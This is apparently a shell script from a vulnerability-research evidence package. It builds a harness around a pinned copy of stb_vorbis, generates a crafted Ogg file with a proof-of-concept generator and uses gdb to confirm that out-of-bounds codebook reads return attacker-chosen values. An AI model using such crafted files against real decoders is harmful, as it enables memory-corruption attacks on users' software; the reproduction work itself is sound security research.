#!/bin/sh
# Reproduce W202: four distinct file-derived words at consecutive OOB offsets.
# Requires gcc, gdb, python3. Run from any directory. Does not alter run-all.sh.
set -u
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$HERE" || exit 2
mkdir -p evidence build/vuln
cp harness.c pinned/stb_vorbis.c build/vuln/
gcc -g -O0 -o build/vuln/harness-plain build/vuln/harness.c -lm || exit 2
# 5th generator arg sets codebook sequence_p=1; default 0 keeps run-all.sh PoCs identical.
python3 gen_poc.py evidence/chosen-seq.ogg 16519105 65 0x4b434148 1 >/dev/null || exit 2
gdb -q -batch \
  -ex 'break stb_vorbis.c:3890' \
  -ex 'ignore 1 2' \
  -ex 'run evidence/chosen-seq.ogg' \
  -ex 'p/x *(unsigned int *)&val' \
  -ex 'p/x *(unsigned int *)&c->multiplicands[2]' \
  -ex 'continue' \
  -ex 'p/x *(unsigned int *)&c->multiplicands[3]' \
  -ex 'continue' \
  -ex 'p/x *(unsigned int *)&c->multiplicands[4]' \
  -ex 'continue' \
  -ex 'p/x *(unsigned int *)&c->multiplicands[5]' \
  ./build/vuln/harness-plain > evidence/gdb-chosen-seq.out 2>&1
PASS=0; FAIL=0
check() {
  # gdb value numbers: $1 = val at first hit, $2..$5 = multiplicands[2..5].
  if grep -qF "\$$1 = $2" evidence/gdb-chosen-seq.out; then
    PASS=$((PASS+1)); echo "PASS $3 $2"
  else
    FAIL=$((FAIL+1)); echo "FAIL $3 expected $2"
  fi
}
check 2 0x4c1270f6 multiplicands[2]
check 3 0x4c434148 multiplicands[3]
check 4 0x4c74119a multiplicands[4]
check 5 0x4c9270f6 multiplicands[5]
echo "TOTAL PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
